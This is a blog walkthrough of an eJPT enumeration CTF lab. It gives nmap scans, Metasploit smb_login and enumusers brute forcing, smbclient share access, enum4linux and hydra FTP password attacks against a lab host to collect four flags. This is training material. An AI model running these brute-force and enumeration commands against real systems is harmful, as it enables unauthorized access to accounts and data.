# :game_die: Walkthrough - Assessment Methodologies: Enumeration CTF 1

---

## Assessment Methodologies: Enumeration CTF 1

# Walkthrough — Assessment Methodologies: Enumeration CTF 1

Welcome, folks! Today, we will be discussing the EJPT CTF-3 (Enumeration) walkthrough, how I solved it, and how I was able to collect all the flags. Keep in mind that I won’t be sharing the flags directly because I want you to learn, rather than just submit flags on the platform. However, I will share the commands that I used and explain my methodology.

Let’s get started:

## Get Mohammed Ali Mistry’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

So, I started with an nmap scan on target, got that its running smb (obviously) then I fired up my PostgreSQL and metasploit. Since its an smb lab I search for modules such as smb_login configured its user file to common_users.txt and pass file to unix_passwords.txt and gave it a go…. Got different creds but only one was of use i.e. administrator one.

```
nmap -sV target.ine.local
service postgresql start && msfconsole
search smb_login
use 0
setg RHOSTS target.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Since I got a cred I started enumerating other users using the enumusers module in metasploit, then I got 3 more usernames. With these usernames I could again try to bruteforce their passwords so I used smb_login again and put these username into a text file and started enumerating.

```
search enumusers
use 3
set USER administrator
set PASS admin
run

search smb_login
set USER_FILE /root/Desktop/wordlists/users.txt
run
```

- Flag 2: One of the samba users have a bad password. Their private share with the same name as their username is at risk!

As soon as I got my first creds of josh I focused on the the second flag and tried to login and woo-hoo got my first flag(actually second).

```
cat /root/Desktop/wordlists/shares.txt
smbclient \\\\target.ine.local\\josh -U josh
dir
get flag2.txt
exit
cat flag2.txt
```

- Flag 1: There is a samba share that allows anonymous access. Wonder what’s in there!

As smb_login was brute forcing which took time I started focusing on the other flags, which was based on anonymous access. So I cat out the list of shares available on desktop’s wordlist I started manually attempting to access this share. After some attempt got the second flag(actually first).

```
smbclient \\\\target.ine.local\\<share>
dir
get flag1.txt
exit
cat flag1.txt
```

- Flag 3: Follow the hint given in the previous flag to uncover this one.

Now if u remember the first flag which we found there was a little clue at the end of it that this machine was running an FTP service.

But but but when I first did an nmap scan there was no service running so I did a full port nmap scan.

And yeah its configured on port 5554, so I started brute forcing using hydra with the users list that I found brute forcing smb………and it failed.

I again did a bruteforce on smb, shares, etc. but found none. Then I used enm4linux as its a gr8 tools for samba enumeration and I found one more user …… ugghhhh. So, I added this one to our list brute forced ftp again using hydra and finally got a hit.

Logged into ftp, downloaded the flag and submitted it.

```
nmap -sV -p0-65535 target.ine.local
hydra -L /root/Desktop/wordlist/users.txt -P /root/Desktop/wordlist/unix_passwords.txt ftp://target.ine.local -s 5554
enum4linux -a target.ine.local
nano /root/Desktop/wordlist/users.txt
hydra -L /root/Desktop/wordlist/users.txt -P /root/Desktop/wordlist/unix_passwords.txt ftp://target.ine.local -s 5554
ftp target.ine.local -P 5554
dir
get flag3.txt
exit
cat flag3.txt
```

- Flag 4: This is a warning meant to deter unauthorized users from logging in.

Lastly, this one was pretty easy as there was only service running on this machine and nothing, so I just logged in and got my flag in the warning message.

```
ssh target.ine.local
```

Hurray we got all the flags, congratulations.
Happy hacking!

---
